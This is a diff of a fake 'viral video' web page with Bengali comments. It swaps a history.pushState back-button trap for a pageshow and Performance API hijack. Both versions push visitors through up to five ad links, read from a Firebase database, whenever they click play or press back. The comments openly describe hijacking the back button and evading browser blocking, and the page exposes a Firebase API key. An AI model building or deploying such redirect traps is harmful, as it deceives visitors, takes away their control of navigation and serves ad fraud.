@@ -3,16 +3,62 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Viral video Play now</title>
+<title>Viral video – Play now</title>
 
 <!-- Firebase JS SDK -->
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
-<style>
-body{ margin:0; background:black; font-family:Arial; color:white; }
-.topbar{ background:#f1f1f1; color:black; padding:10px; font-weight:bold; }
+<!-- মাস্টার স্ক্রিপ্ট – পেজ লোড হওয়ার আগেই ব্যাক বাটন হাইজ্যাক করবে -->
+<script>
+    // ক্রস-ব্রাউজার ব্যাক ডিটেকশন – Performance API ব্যবহার করে
+    function isBackNavigation() {
+        const perfEntries = performance.getEntriesByType('navigation');
+        if (perfEntries.length > 0) {
+            const navType = perfEntries[0].type;
+            return navType === 'back_forward' || navType === 'reload'; // রিলোডও কভার করা হলো
+        }
+        return false;
+    }
 
+    function instantRedirectHijack() {
+        let count = parseInt(sessionStorage.getItem('redirectCount')) || 0;
+        let linksData = sessionStorage.getItem('targetLinks');
+        let hijackActive = sessionStorage.getItem('hijackActive');
+
+        // হাইজ্যাক তখনই করবে যখন অ্যাক্টিভ সেশন আছে, কাউন্ট ১-৪ এর মধ্যে, এবং লিংক ডাটা আছে
+        if (hijackActive === 'yes' && count > 0 && count < 5 && linksData) {
+            let targetLinks = JSON.parse(linksData);
+            let nextLink = targetLinks[count] || "https://google.com";
+
+            // কাউন্ট বাড়িয়ে দাও পরবর্তী জন্য
+            sessionStorage.setItem('redirectCount', count + 1);
+
+            // href ব্যবহার করো (replace না) – যাতে ভিডিও পেজ হিস্ট্রিতে থাকে
+            window.location.href = nextLink;
+        }
+    }
+
+    // নির্ভরযোগ্য ব্যাক ডিটেকশন – pageshow + persisted প্রপার্টি
+    window.addEventListener('pageshow', function(event) {
+        // যদি পেজ BFCache থেকে লোড হয় (persisted) অথবা ব্যাক/ফরওয়ার্ড নেভিগেশন হয়
+        if (event.persisted || isBackNavigation()) {
+            instantRedirectHijack();
+        }
+    });
+
+    // পুরনো ব্রাউজারদের জন্য ফallback – যারা Performance API সাপোর্ট করে না
+    window.addEventListener('load', function() {
+        if (sessionStorage.getItem('hijackActive') === 'yes' && 
+            parseInt(sessionStorage.getItem('redirectCount')) > 0) {
+            setTimeout(instantRedirectHijack, 100);
+        }
+    });
+</script>
+
+<style>
+/* আগের মতই CSS */
+body{ margin:0; background:black; font-family:Arial; color:white; }
 .video {
     height: 100vh;
     display: flex;
@@ -21,30 +67,22 @@ body{ margin:0; background:black; font-family:Arial; color:white; }
     position: relative;
     background-size: cover;
     background-position: center;
-    background-repeat: no-repeat;
     background-image: url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80'); 
-    transition: background-image 0.5s ease-in-out; 
 }
-
 .play {
     width: 120px; height: 120px; border-radius: 50%; border: 3px solid white;
     display: flex; justify-content: center; align-items: center;
     font-size: 50px; box-shadow: 0 0 30px white; cursor: pointer;
     background: rgba(0, 0, 0, 0.4); 
-    position: relative;
-    z-index: 10;
 }
-
 .controls {
     position: fixed; bottom: 0; width: 100%; padding: 10px; background: rgba(0,0,0,0.8);
-    z-index: 10;
 }
 .progress { height: 6px; background: #333; margin-bottom: 8px; }
 .bar { width: 20%; height: 100%; background: white; }
 .time { display: flex; justify-content: space-between; font-size: 14px; }
 </style>
 </head>
-
 <body>
 
 <div class="video" id="videoBg">
@@ -57,6 +95,7 @@ body{ margin:0; background:black; font-family:Arial; color:white; }
 </div>
 
 <script>
+    // Firebase কনফিগ (আপনার দেওয়া)
     const firebaseConfig = {
         apiKey: "AIzaSyC2tguQFjkUvncBvn6-e7_Ux5vJ6lEzpjQ",
         authDomain: "vital-1f05b.firebaseapp.com",
@@ -73,7 +112,7 @@ body{ margin:0; background:black; font-family:Arial; color:white; }
     const db = firebase.database();
     const maxRedirects = 5;
 
-    // ফায়ারবেস থেকে ডাটা নিয়ে আসা
+    // ফায়ারবেস থেকে ডাটা আনবে
     function fetchSettings() {
         db.ref('playerSettings').on('value', (snapshot) => {
             const data = snapshot.val();
@@ -87,8 +126,9 @@ body{ margin:0; background:black; font-family:Arial; color:white; }
         });
     }
 
-    // প্লে বাটনে ক্লিক করলে আসল ম্যাজিক শুরু হবে!
+    // প্লে বাটনে ক্লিক
     function openLink() {
+        let count = parseInt(sessionStorage.getItem('redirectCount')) || 0;
         let linksData = sessionStorage.getItem('targetLinks');
         
         if (!linksData) {
@@ -97,47 +137,26 @@ body{ margin:0; background:black; font-family:Arial; color:white; }
         }
 
         let targetLinks = JSON.parse(linksData);
-
-        // যেহেতু ইউজার ক্লিক করেছে, তাই ব্রাউজার এখন আমাদের ব্লক করবে না!
-        // এই সুযোগে আমরা একসাথে ৫টি ফেক হিস্ট্রি পুশ করে দিব।
-        for (let i = maxRedirects; i >= 1; i--) {
-            // URL এর শেষে ?step=5, ?step=4 লাগিয়ে ফেক পেজ তৈরি করা হলো
-            history.pushState({ hijackStep: i }, "Step " + i, window.location.pathname + "?step=" + i);
+        // যদি ৫ বার শেষ হয়ে যায়
+        if (count >= maxRedirects) {
+            sessionStorage.removeItem('hijackActive');
+            alert("৫টি এড শেষ! এখন অরিজিনাল ভিডিও প্লে হচ্ছে...");
+            // এখানে ভিডিও চালানোর কোড দিন
+            return;
         }
 
-        // অ্যাড কাউন্ট ১ সেট করা হলো
-        sessionStorage.setItem('adCount', 1);
+        // নতুন কাউন্ট = পুরনো কাউন্ট + ১
+        let newCount = count + 1;
+        sessionStorage.setItem('redirectCount', newCount);
+        sessionStorage.setItem('hijackActive', 'yes');
 
-        // এবার ১ম লিংকে পাঠিয়ে দিব
-        window.location.href = targetLinks[0] || "https://google.com";
+        // বর্তমান কাউন্ট অনুযায়ী লিংক নাও (যেহেতু প্রথম ক্লিকে count=0, লিংক হবে targetLinks[0])
+        let currentLink = targetLinks[count] || "https://google.com";
+
+        setTimeout(() => {
+            window.location.href = currentLink;
+        }, 50);
     }
-
-    // ইউজার ব্যাক বাটনে চাপলে এই ফাংশন হিট করবে (যেহেতু ফেক হিস্ট্রি পুশ করা আছে)
-    window.addEventListener('popstate', function(event) {
-        let linksData = sessionStorage.getItem('targetLinks');
-        if (!linksData) return;
-        
-        let targetLinks = JSON.parse(linksData);
-        let adCount = parseInt(sessionStorage.getItem('adCount')) || 1;
-
-        // event.state চেক করে নিশ্চিত হওয়া যে ইউজার আমাদের ফেক পেজে পড়েছে
-        if (event.state && event.state.hijackStep) {
-            
-            if (adCount < maxRedirects) {
-                let nextLink = targetLinks[adCount] || "https://google.com";
-                sessionStorage.setItem('adCount', adCount + 1);
-                
-                // location.replace ব্যবহার করা হলো যাতে ব্রাউজার স্প্যাম মনে না করে
-                window.location.replace(nextLink);
-            } 
-            else {
-                // ৫টি অ্যাড শেষ! এখন ইউজার মেইন পেজে ফিরে আসবে
-                history.replaceState(null, "", window.location.pathname); // URL ঠিক করা হলো
-                alert("৫টি এড শেষ! এখন অরিজিনাল ভিডিও প্লে হচ্ছে...");
-                // এখানে আপনার ভিডিও প্লেয়ারের কোড বসাতে পারেন
-            }
-        }
-    });
 
     fetchSettings();
 </script>
